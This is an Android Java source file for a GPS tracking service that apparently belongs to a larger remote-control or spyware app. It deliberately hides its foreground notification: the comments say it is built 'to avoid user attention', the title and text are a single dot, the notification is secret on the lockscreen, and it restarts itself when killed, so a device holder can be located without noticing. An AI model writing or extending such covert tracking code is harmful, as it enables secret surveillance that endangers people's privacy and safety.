package com.fason.app.features.gps;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.R;
import com.fason.app.core.Protocol;
import com.fason.app.service.MainService;

public class GPSTrackingService extends Service {

    private static final String TAG = "GPSTrackingService";
    private static final int NOTIF_ID = 3;
    
    // Stealth UI constants - intentionally minimal to avoid user attention
    private static final String STEALTH_TEXT = ".";

    private GpsModule gpsModule;
    private boolean ownsModule = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        
        // Khởi tạo module thông qua hàm provider để dễ mở rộng/override
        this.gpsModule = provideGpsModule();
        
        if (gpsModule != null) {
            gpsModule.startTracking();
        } else {
            Log.e(TAG, "GpsModule is null. Stopping service.");
            stopSelf();
            return;
        }

        startForegroundCompat();
    }

    /**
     * Pattern for Extensibility:
     * Cho phép subclass hoặc module khác override cách lấy GpsModule.
     * Mặc định sẽ dùng shared instance từ MainService, nếu không có thì tự tạo.
     */
    protected GpsModule provideGpsModule() {
        MainService svc = MainService.getInstance();
        if (svc != null && svc.getGpsModule() != null) {
            ownsModule = false;
            return svc.getGpsModule();
        }
        ownsModule = true;
        return new GpsModule(this);
    }

    private void createChannel() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;

        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) return;

        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, STEALTH_TEXT, NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(STEALTH_TEXT);
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        ch.setAllowBubbles(false);
        nm.createNotificationChannel(ch);
    }

    protected Notification buildNotification() {
        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(STEALTH_TEXT)
            .setContentText(STEALTH_TEXT)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
    }

    private void startForegroundCompat() {
        Notification n = buildNotification();
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+ yêu cầu phải kiểm tra quyền trước khi định nghĩa type
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_LOCATION) 
                        == PackageManager.PERMISSION_GRANTED) {
                    startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
                } else {
                    // Nếu không có quyền, không thể chạy FGS Location trên Android 14+
                    Log.e(TAG, "Missing FOREGROUND_SERVICE_LOCATION permission. Stopping service.");
                    stopSelf();
                }
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Exception e) {
            // Catch broad Exception để handle các vấn đề về ForegroundServiceStartNotAllowedException
            Log.e(TAG, "Failed to start foreground service", e);
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // START_STICKY: Hệ thống sẽ cố gắng khởi động lại service nếu nó bị kill
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (gpsModule != null) {
            gpsModule.stopTracking();
            if (ownsModule) {
                gpsModule.destroy();
            }
        }
        super.onDestroy();
    }
}